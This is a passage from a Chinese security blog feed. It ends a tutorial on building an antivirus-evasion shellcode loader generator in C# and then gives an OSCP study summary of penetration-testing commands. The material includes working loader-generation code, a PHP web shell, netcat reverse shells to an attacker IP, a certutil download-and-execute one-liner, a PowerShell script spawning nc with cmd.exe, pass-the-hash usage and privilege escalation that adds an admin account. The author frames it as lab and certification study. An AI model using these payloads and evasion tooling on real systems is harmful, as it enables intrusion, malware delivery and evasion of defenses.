class="comment">//由调用程序获取输出信息</span></span><br><span class="line">            p.StartInfo.RedirectStandardError = <span class="literal">true</span>;<span class="comment">//重定向标准错误输出</span></span><br><span class="line">            p.StartInfo.CreateNoWindow = <span class="literal">true</span>;<span class="comment">//不显示程序窗口</span></span><br><span class="line">            p.Start();<span class="comment">//启动程序</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//向cmd窗口发送输入信息</span></span><br><span class="line">            p.StandardInput.WriteLine(cmd + <span class="string">"&amp;exit"</span>);</span><br><span class="line"></span><br><span class="line">            p.StandardInput.AutoFlush = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取cmd窗口的输出信息</span></span><br><span class="line">            output = p.StandardOutput.ReadToEnd();</span><br><span class="line"></span><br><span class="line">            p.WaitForExit();<span class="comment">//等待程序执行完退出进程</span></span><br><span class="line">            p.Close();</span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//core.cs</span></span><br><span class="line"><span class="comment">//编译cpp源码</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">CPP_Compiler</span>(<span class="params"><span class="keyword">string</span> arch, <span class="keyword">string</span> source_path, <span class="keyword">string</span> save_path, <span class="keyword">bool</span> res = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> arch_cmd = <span class="string">" -m"</span> + arch.Substring(<span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">string</span> compile_cmd = <span class="string">@"c++ -mwindows -o """</span> + save_path + <span class="string">@""""</span> + arch_cmd + <span class="string">@" """</span> + source_path + <span class="string">@""""</span>;</span><br><span class="line">            <span class="keyword">if</span> (res)</span><br><span class="line">            &#123;</span><br><span class="line">                compile_cmd += <span class="string">@" C:\\res.o"</span>;</span><br><span class="line">             </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!Common.Execute_Cmd(compile_cmd).Contains(<span class="string">"rror:"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h4 id="三、生成源码"><a href="#三、生成源码" class="headerlink" title="三、生成源码"></a>三、生成源码</h4><p>有了免杀源码和编译方式，后面就需要前两者组合起来，将免杀的源码生成出来并且编译。<br>主要过程有生成随机的编译信息以及将免杀源码中”“段进行替换，随后将完整代码生成出来编译。<br>示例如下：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core.cs</span></span><br><span class="line"><span class="comment">//生成CPP_Direct源码并编译</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Gen_CPP_Direct</span>(<span class="params"><span class="keyword">string</span> shellcode, <span class="keyword">string</span> arch, <span class="keyword">string</span> path</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;<span class="comment">//需要修改</span></span><br><span class="line">            <span class="keyword">string</span> finalcode;</span><br><span class="line">            <span class="comment">//生产随机编译信息</span></span><br><span class="line">            Random r = <span class="keyword">new</span> Random();</span><br><span class="line">            <span class="keyword">int</span> n = r.Next(<span class="number">0</span>, Global.Company_name.Length - <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">string</span> comname = Global.Company_name[n];</span><br><span class="line">            <span class="keyword">string</span> c_compile_info = Global.compile_info.Replace(<span class="string">"&#123;&#123;companyname&#125;&#125;"</span>, comname);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入文件</span></span><br><span class="line">            System.IO.File.WriteAllText(<span class="string">"C:\\res.rc"</span>, c_compile_info);</span><br><span class="line">            <span class="keyword">string</span> res_cmd = <span class="string">"windres C:\\res.rc C:\\res.o"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//位数判断</span></span><br><span class="line">            <span class="keyword">if</span> (arch.StartsWith(<span class="string">"32"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                res_cmd += <span class="string">" --target=pe-i386"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Common.Execute_Cmd(res_cmd);</span><br><span class="line">            <span class="keyword">bool</span> icon_set = System.IO.File.Exists(<span class="string">"C:\\res.o"</span>);</span><br><span class="line"></span><br><span class="line">            finalcode = CPP_Direct.Base_Code.Replace(<span class="string">"&#123;&#123;shellcode&#125;&#125;"</span>, shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//保存代码到临时文件</span></span><br><span class="line">            <span class="keyword">string</span> temp_path = <span class="string">@"C:\TEMP_"</span> + Common.GetRandomString(<span class="number">6</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="string">""</span>) + <span class="string">".cpp"</span>;</span><br><span class="line">            System.IO.File.WriteAllText(temp_path, finalcode);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//编译</span></span><br><span class="line">            <span class="keyword">if</span> (CPP_Compiler(arch, temp_path, path, icon_set))</span><br><span class="line">            &#123;</span><br><span class="line">                System.IO.File.Delete(temp_path); <span class="comment">//测试时记得注释掉这段，可以在C盘下看到源码</span></span><br><span class="line">                System.IO.File.Delete(<span class="string">"C:\\res.o"</span>);</span><br><span class="line">                System.IO.File.Delete(<span class="string">"C:\\res.rc"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                System.IO.File.Delete(temp_path);</span><br><span class="line">                System.IO.File.Delete(<span class="string">"C:\\res.o"</span>);</span><br><span class="line">                System.IO.File.Delete(<span class="string">"C:\\res.rc"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<h4 id="四、触发事件"><a href="#四、触发事件" class="headerlink" title="四、触发事件"></a>四、触发事件</h4><p>以上流程都走完后，我们就需要画一个窗体应用程序，可以加上自己所需要的功能进行开发。<br>以此处为例就只需要一个填写shellcode的文本框、一个生成按钮以及一个保存文件位置的控件。<br>画好后双击生成按钮进入编写触发事件的代码：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs </span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">button1_Click</span>(<span class="params"><span class="keyword">object</span> sender, EventArgs e</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            saveFileDialog1.Filter = <span class="string">"可执行文件|*.exe"</span>;</span><br><span class="line">            <span class="keyword">if</span> ((saveFileDialog1.ShowDialog() == DialogResult.OK) &amp;&amp; (saveFileDialog1.FileName != <span class="string">""</span>) &amp;&amp; (richTextBox1.Text.Trim() != <span class="string">""</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">if</span> (comboBox2.Text == <span class="string">"CPP_Direct"</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    result = Core.Gen_CPP_Direct(richTextBox1.Text, comboBox1.Text, saveFileDialog1.FileName);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (result)</span><br><span class="line">                &#123;</span><br><span class="line">                    MessageBox.Show(<span class="string">"生成成功！"</span>, <span class="string">"成功"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    MessageBox.Show(<span class="string">"生成失败！请检查你的输入"</span>, <span class="string">"失败"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>


<h4 id="五、C-免杀代码编译"><a href="#五、C-免杀代码编译" class="headerlink" title="五、C#免杀代码编译"></a>五、C#免杀代码编译</h4><p>上面都是用C#窗体程序编译C++做的演示，如果需要添加C#语言的免杀源码。我们可以使用CSharpCodeProvider类来操作。<br>首先创建一个用来编译C#语言免杀代码的类（下面代码抄就完事了）：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//compiler.cs</span></span><br><span class="line"><span class="keyword">using</span> Microsoft.CSharp;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.CodeDom.Compiler;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">A</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Compiler</span></span><br><span class="line">    &#123;</span><br><span class="line">        CSharpCodeProvider provider = <span class="keyword">new</span> CSharpCodeProvider();</span><br><span class="line">        CompilerParameters parameters = <span class="keyword">new</span> CompilerParameters();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Compiler</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            parameters.ReferencedAssemblies.Add(<span class="string">"System.Core.dll"</span>);</span><br><span class="line">            parameters.GenerateInMemory = <span class="literal">false</span>;</span><br><span class="line">            parameters.GenerateExecutable = <span class="literal">true</span>;</span><br><span class="line">            parameters.IncludeDebugInformation = <span class="literal">false</span>;</span><br><span class="line">            parameters.ReferencedAssemblies.Add(<span class="string">"mscorlib.dll"</span>);</span><br><span class="line">            parameters.ReferencedAssemblies.Add(<span class="string">"System.dll"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">compileToExe</span>(<span class="params">String code, String Arch, String filePath</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line"></span><br><span class="line">            parameters.OutputAssembly = filePath;</span><br><span class="line">            parameters.CompilerOptions = Arch;</span><br><span class="line"></span><br><span class="line">            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (results.Errors.HasErrors)</span><br><span class="line">            &#123;</span><br><span class="line">                StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">foreach</span> (CompilerError error <span class="keyword">in</span> results.Errors)</span><br><span class="line">                &#123;</span><br><span class="line">                    sb.AppendLine(String.Format(<span class="string">"Error (&#123;0&#125;): &#123;1&#125;"</span>, error.ErrorNumber, error.ErrorText));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(sb.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>C#免杀代码同样也是放在一个类里，如上二的前半部分，修改好单引号问题和加双花括号做标记。不同的是编译时直接调用上面写好的Compiler类直接生成，跳过源码生成输出本地的步骤。示例代码如下：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//core.cs        </span></span><br><span class="line"><span class="comment">//生成CS源码并编译</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Gen_CS_Base</span>(<span class="params"><span class="keyword">string</span> xor_shellcode,  <span class="keyword">string</span> arch, <span class="keyword">string</span> path</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">string</span> target_arch = <span class="string">"/platform:x86 /optimize /target:winexe "</span>;</span><br><span class="line">            <span class="keyword">if</span> (arch.StartsWith(<span class="string">"6"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                target_arch = target_arch.Replace(<span class="string">"86"</span>, <span class="string">"64"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">string</span> finalcode = <span class="string">""</span>;</span><br><span class="line">            finalcode = CS_Base.Base_Code.Replace(<span class="string">"&#123;&#123;xor_shellcode&#125;&#125;"</span>, xor_shellcode)<span class="comment">//替换添加shellcode</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//编译</span></span><br><span class="line">            Compiler compiler = <span class="keyword">new</span> Compiler();</span><br><span class="line">            compiler.compileToExe(finalcode, target_arch, path);</span><br><span class="line">            <span class="comment">//System.IO.File.WriteAllText(@"C:\22222222222222222222code.txt", finalcode);//需要看源码对不对就取消注释</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>最后在加上生成按钮的触发事件即可。</p>
<h3 id="回头看"><a href="#回头看" class="headerlink" title="回头看"></a>回头看</h3><p>通过以上，一个简陋的生成器便做好了，整体过程如下：<br>填写shellcode-&gt;触发生成按钮事件-&gt;替换shellcode数据进源码-&gt;生成源码文件（C#跳过）-&gt;编译源码<br>根据这个流程，我们可以在此基础上添加自己需要的其他功能，如shellcode混淆加密、反沙箱、生成dll文件等等。<br>另外可以将混淆加密方式独立成一个类，选择不同的加密方式时只需将对应的代码替换进相应的源码，随后编译即可，同理也可以将执行方式和反沙箱方式都独立出来。<br></p>
<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://github.com/1y0n/AV_Evasion_Tool" target="_blank" rel="noopener">https://github.com/1y0n/AV_Evasion_Tool</a><br><a href="https://github.com/knownsec/shellcodeloader" target="_blank" rel="noopener">https://github.com/knownsec/shellcodeloader</a><br><a href="https://www.ired.team/" target="_blank" rel="noopener">https://www.ired.team/</a><br><a href="https://idiotc4t.com/" target="_blank" rel="noopener">https://idiotc4t.com/</a></p>
]]></content>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>OSCP总结</title>
    <url>/2021/02/18/OSCP%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>20年11月中旬，我正式开始了OSCP认证，在这之前也做了一些vulnhub上的靶场，其中的笔记也在博客上发布了，但是跟OSCP相比，那些都还是属于非常简单没有任何难度的。<br>提交材料审核付款过后，官方给的教材PDF是非常有用的，个人觉得可以作为高校的教科书来使用，其中涉及的技术基本涵盖了一个渗透工程师所需要的所有技能，包括主被动信息收集、web漏洞、win/linux缓冲区溢出、客户端攻击（包含社工）、文件传输及bypass、av bypass、提权、端口转发及隧道、内网域、密码、powershell等各种知识，虽然大家在做渗透的过程中都会用到，但是你绝对想象不到官方的教材有多么的细致及全面。我有时候看PDF都会觉得：卧槽，还有这种东西？ 不得不说这钱是花的非常值得的，光是PDF就受益良多。另外官方的实验靶场也是非常有意思，官方为实验室新手准备的攻击路径手册，其大致就是告诉新人该从哪些机器开始做，官方论坛中会有公开的这个手册前两题的解题过程，跟着帖子走，你会发现满满7页的解题过程居然要注意那么多细节，尽管它还是属于easy难度的题目。官方会从IP着手，教你如何找到内网中的DNS服务器，并且找到目标的机器名（每台机器都会有一个特别的名字，并且这个名字可能是某种提示），以及如何更好的扫描端口等各种信息收集。针对端口，官方会指引你怎么找到这个端口更具体的版本信息，以及是否存在合适的漏洞。看完第一题的解题思路就花了我2天的时间，其中不乏要反复理解官方用意和渗透的思路。这是官方想要教会你的东西。毕竟每一台机器都是不一样的，每一台机器的解决方法都是不一样的。同一套方法不能一直使用下去，那如何在渗透过程中获取思路是至关重要的。<br>常规的机器，你可能花费1天时间就能做完，简单的web题一天也许能做3台。但是实验室中还有很多需要找到“朋友”才能做的机器，这些无非是目标和其他的机器有关联，你可能需要其他机器的账号密码凭证或者需要通过其他机器社工发送恶意文档又或者“朋友”上运行了和目标同样的服务，该服务需要通过溢出才能拿到shell等等。这些都十分的有意思并且做起来也十分的痛苦。但注意细节就是官方一直在教授你的东西，正如真实环境中的渗透一样，任何一个小小的细节也许就是你成功的机会。并且克服困难所带来的成就感会让你信心倍增。<br>我买了3个月的实验室靶场时间，在做了50多题之后预约了考试，当时实验室还有大半个月的时间，我是想着如果第一次没考过，那还有剩余的时间做练习，不用再重新花钱买。本着试一试的心态，加上疯狂的复习和看PDF，一次就过了，运气真好。哈哈哈。不过还是告诫一下，靶场至少做30台，这样才会有50%的几率通过考试。<br>下面是一些做的过程中留下来的笔记，由于官方不允许将实验室靶场的解题过程公开，所以这里就放一下小tips。都是在做题目时留下来的一些需要注意的小东西，都是能在网上找到并且具有详细说明的东西。<br>有进一步想要交流的小伙伴，可以mail我。</p><a id="more"></a>
<hr>
<p>免费靶场总结：</p>
<h6 id="JisCTF："><a href="#JisCTF：" class="headerlink" title="JisCTF："></a>JisCTF：</h6><p>查找允许xxxc用户访问的所有文件的列表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -user xxxc -type f 2&gt;&amp;1 | grep -v “Permission” | grep -v “No such”</span><br></pre></td></tr></table></figure>
<p>一句话简单shell语句：xxxc.php?cmd=whoami</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if(isset($_REQUEST[‘cmd’]))&#123; echo “&lt;pre&gt;”; $cmd = ($_REQUEST[‘cmd’]); system($cmd); echo “&lt;/pre&gt;”; die; &#125;?&gt;</span><br></pre></td></tr></table></figure>
<h6 id="Five86-2"><a href="#Five86-2" class="headerlink" title="Five86-2:"></a>Five86-2:</h6><p>wordpress扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --url 192.168.1.3 -e u   //爆破用户名</span><br><span class="line">wpscan --url http://192.168.1.3 -U users.txt -P /usr/share/wordlists/rockyou.txt   //爆破密码</span><br></pre></td></tr></table></figure>

<p>获得交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br><span class="line">python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br></pre></td></tr></table></figure>
<p>tcpdump抓网卡流量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timeout 150 tcpdump -w xxx.pcap -i vexxxxxxxcd</span><br></pre></td></tr></table></figure>
<h6 id="HAwordy"><a href="#HAwordy" class="headerlink" title="HAwordy:"></a>HAwordy:</h6><p>wpscan找插件，然后searchexploit找漏洞，打就完事了<br>提权用的是john解密passwd文件的hash</p>
<h6 id="lazysysadmin"><a href="#lazysysadmin" class="headerlink" title="lazysysadmin:"></a>lazysysadmin:</h6><p>smbmap是映射权限和文件夹的最佳工具之一</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H xx.xx.xx.xx  //（445端口）</span><br></pre></td></tr></table></figure>
<p>smbclient是smb连接工具</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient //xx.xx.xx.xx/share</span><br></pre></td></tr></table></figure>

<h6 id="GitRoot"><a href="#GitRoot" class="headerlink" title="GitRoot:"></a>GitRoot:</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster vhost –u gitroot.vuln -w /usr/share/dirb/wordlists/common.txt（/usr/share/dirb/wordlists/big.txt）| grep 200   //爆破虚拟主机名</span><br><span class="line">find / -name .git 2&gt;/dev/null   //根目录下查找.git文件（或目录）</span><br></pre></td></tr></table></figure>
<h6 id="powergrid"><a href="#powergrid" class="headerlink" title="powergrid:"></a>powergrid:</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -f xx.xx.xx.xx http-get /zmail_path    //爆破类basic认证页面方法</span><br></pre></td></tr></table></figure>

<hr>
<p>官方实验靶场总结：</p>
<p>nmap快速扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 10.x.x.x --top-ports 10 --open    //top10</span><br></pre></td></tr></table></figure>
<p>nikto扫漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nikto -host 10.x.x.x</span><br></pre></td></tr></table></figure>
<p>有配置文件看配置文件，里面可能存在密码</p>
<p>循环递归扫目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -E -r -u http://xxx.xx.xx.x/</span><br></pre></td></tr></table></figure>
<p>查看banner</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv ip port (可以加个-C参数,CRLF)</span><br></pre></td></tr></table></figure>

<p>循环查看pop3用户邮件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for user in marcus john mailadmin jenny ryuu joe45; do</span><br><span class="line">    ( echo USER $&#123;user&#125;; sleep 2s; echo PASS abcd; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC 10.x.x.x 110;  done</span><br></pre></td></tr></table></figure>
<p>pop3(110端口)命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">USER ryuu  //用户名</span><br><span class="line">PASS abcd   //密码</span><br><span class="line">LIST   //列出邮件</span><br><span class="line">RETR 1  //读取邮件顺序</span><br></pre></td></tr></table></figure>
<p>查看当前环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br></pre></td></tr></table></figure>
<p>linux受限shell环境bypass</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://www.exploit-db.com/papers/44592/</span><br></pre></td></tr></table></figure>
<p>searchsploit操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">searchsploit -u   //更新</span><br><span class="line">searchsploit -x num  //显示对应文本</span><br><span class="line">searchsploit -w num  //显示对应链接</span><br><span class="line">searchsploit -p num   //完整显示（文本位置、URL、名称）非常好用的功能！</span><br><span class="line">searchsploit -m num   //顺便把文件复制出来！</span><br></pre></td></tr></table></figure>
<p>cat操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat -n xxx.py   //标准输出内容</span><br></pre></td></tr></table></figure>
<p>nmap扫描漏洞（-A很重要，也许能看到东西）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -sV -Pn --open -T4 --script vuln -p- 10.x.x.x --dns-server 10.x.x.x   //扫描IP漏洞(加了个dns-server)</span><br><span class="line">nmap --script smb-vuln* -p 135,139,445,1025 10.x.x.x   //扫描17010漏洞，主要看445</span><br></pre></td></tr></table></figure>
<p>windows在c盘查找文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir /a /s /b c:\&quot;proof.txt&quot;   //查找proof.txt文件(/a表示查看隐藏文件)</span><br><span class="line">type proof.txt    //显示文件内容</span><br><span class="line">type &quot;C:\.....proof.txt&quot;</span><br></pre></td></tr></table></figure>
<p>linux查找文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -name proof.txt 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>找端口服务很重要！要仔细！</p>
<p>循环查找RDNS域名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for ip in $(seq 0 255); do host 10.x.x.$ip 10.x.x.x; done | grep -i &quot;name&quot;  //通过10.x.x.x DNS服务器反向查找C端内IP对应域名</span><br></pre></td></tr></table></figure>
<p>ftp未授权扫描！！！<br>windows nc反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本地：nc -nvlp 65530 </span><br><span class="line">远程 nc xx.xx.xx.xx 65530 -e c:\windows\system32\cmd.exe    //windows</span><br><span class="line">远程 nc xx.xx.xx.xx 65530 -e /bin/bash   //linux</span><br></pre></td></tr></table></figure>
<p>吐司webshell烂土豆Juicypotato提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JuicyPotato.exe -p &quot;net user admin admin /add&quot;  //net localgroup administrators admin /add    //建用户</span><br></pre></td></tr></table></figure>

<p>msf扫描smb版本模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
<p>查找samba/smb版本命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sC -sV -p139,445 10.x.x.x</span><br></pre></td></tr></table></figure>
<p>找到对应版本的漏洞，msf直接打就完了</p>
<p>学习手工注入oralce</p>
<p>google很重要！<br>msf自动注入进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_nonx_tcp    //这里需要改成对应的</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set AutoRunScript post/windows/manage/migrate</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p>查看samba/smb共享</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient -L 10.x.x.x    //查看共享目录（不一定需要445,139也可以）</span><br><span class="line">smbclient //10.x.x.x/home   //查看文件</span><br></pre></td></tr></table></figure>
<p>看到home目录就要记得有可能是用户名！！！<br>查看文件前和后几行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -n 10 xxx.txt   //查看re.txt前10行</span><br><span class="line">tail -n 10 xxx.txt   //查看re.txt后10行</span><br><span class="line">tail -f xxx.txt   //持续显示文件内容</span><br></pre></td></tr></table></figure>
<p>将内容追加至文件结尾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;whoami &gt; /root/who.txt&quot; &gt;&gt; cleanup.sh</span><br></pre></td></tr></table></figure>
<p>suid提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>从页面提取字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl http://xx.xx.xx.xx/index.php -w dict.txt    //从页面提取文字到字典，-w保存文件</span><br></pre></td></tr></table></figure>
<p>记得查看页面源码！！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;src=/xxxx/&quot;  //也许这就是后台目录啊！！！！</span><br><span class="line">用linkfinder也不错</span><br></pre></td></tr></table></figure>
<p>发现的程序名称，缩写全写都要在searchsploit里面找找<br>获取交互式shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br><span class="line">python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;    //获得交互式shell</span><br><span class="line">bash -i     //也许可以</span><br></pre></td></tr></table></figure>
<p>提权文章看这：<a href="https://xz.aliyun.com/t/7924#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/7924#toc-1</a></p>
<p>nmap的脚本很重要，另外对陌生程序的google也很重要</p>
<p>NC反弹shell,看上面xx机器，一定要加-e参数！！！<br>用的webshell记得看下版本是不是对应机器可用的，oscp机器很老！！！<br>google “windows xp sp1 privesc”提的权</p>
<p>看源码！数据库连接凭证！</p>
<p>suid 使用方式“google”<br>bypass disable func </p>
<p>生成linux用户秘钥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt data 123</span><br></pre></td></tr></table></figure>

<p>echo写入覆盖是&gt; 追加是 &gt;&gt;<br>lse提权脚本真不错！</p>
<p>windows上传文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe /c &quot;certutil.exe -urlcache -split -f http://1.1.1.1/test.exe &amp;test.exe &amp;del test.exe&quot;</span><br></pre></td></tr></table></figure>
<p>pth使用（当拥有一个用户的凭证后）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//创建ps1脚本</span><br><span class="line">$secpasswd = ConvertTo-SecureString &quot;&lt;password&gt;&quot; -AsPlainText -Force</span><br><span class="line">$mycreds = New-Object System.Management.Automation.PSCredential (&quot;&lt;user&gt;&quot;, $secpasswd)</span><br><span class="line">$computer = &quot;&lt;hostname&gt;&quot;</span><br><span class="line">[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;&lt;attacker_ip&gt; 4444 -e cmd.exe&quot;, $mycreds.Username, $mycreds.Password, $computer)</span><br><span class="line">//cmd终端下执行即可</span><br><span class="line">powershell -ExecutionPolicy Bypass -File c:\users\public\r.ps1</span><br></pre></td></tr></table></figure>
<p>windows提权文章:<a href="https://guif.re/windowseop" target="_blank" rel="noopener">https://guif.re/windowseop</a></p>
<p>psexec:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ pth-winexe -U offsec%aad3b43xxxx:2892d26cdf84d7a70xxxx //10.x.x.x cmd  </span><br><span class="line">E_md4hash wrapper called.  </span><br><span class="line">HASH PASS: Substituting user supplied NTLM HASH...  </span><br><span class="line">Microsoft Windows [Version 10.0.16299.309]  </span><br><span class="line">(c) 2017 Microsoft Corporation. All rights reserved.  </span><br><span class="line">C:\Windows\system32</span><br></pre></td></tr></table></figure>
<p>linux查找全局可写文件、目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>vim 使用：</p>
